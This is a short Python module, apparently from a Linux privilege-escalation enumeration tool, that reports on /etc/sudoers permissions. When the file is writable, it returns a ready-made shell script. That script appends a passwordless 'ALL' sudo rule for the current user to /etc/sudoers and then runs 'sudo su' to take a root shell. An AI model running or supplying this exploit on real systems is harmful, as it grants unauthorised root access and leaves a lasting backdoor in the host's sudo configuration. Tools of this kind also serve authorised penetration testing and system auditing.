script = """
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su
"""

def sudoersResults(message):
  if message.strip().lower() == "write":
    return {
      "title": "/etc/sudoers File",
      "results": [{
        "message": "The /etc/sudoers file has write permission",
        "scripts": [ script ]
      }]
    }
  
  if message.strip().lower() == "read":
    return {
      "title": "/etc/sudoers File",
      "results": [{
        "message": "The /etc/sudoers file has read permission",
        "scripts": []
      }]
    }

  return ""